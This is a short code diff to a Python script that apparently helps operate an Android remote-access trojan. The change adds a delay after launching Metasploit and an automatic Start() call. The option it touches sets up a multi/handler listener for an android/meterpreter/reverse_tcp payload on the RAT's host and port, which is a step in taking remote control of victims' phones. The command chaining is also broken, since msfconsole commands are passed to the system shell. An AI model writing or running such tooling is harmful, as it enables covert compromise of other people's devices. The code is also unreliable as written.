@@ -1,4 +1,5 @@
 import os
+import time
 from colorama import Fore,init
 
 init()
@@ -23,5 +24,13 @@ def Start():
 
     if input_options == "2":
         os.system("msfconsole")
+        time.sleep(50)
         os.system(f"use multi/handler && set payload android/meterpreter/reverse_tcp && set lhost {host_of_RAT} && set lport {port_of_RAT} && exploit")
 
+
+
+
+
+
+
+Start()
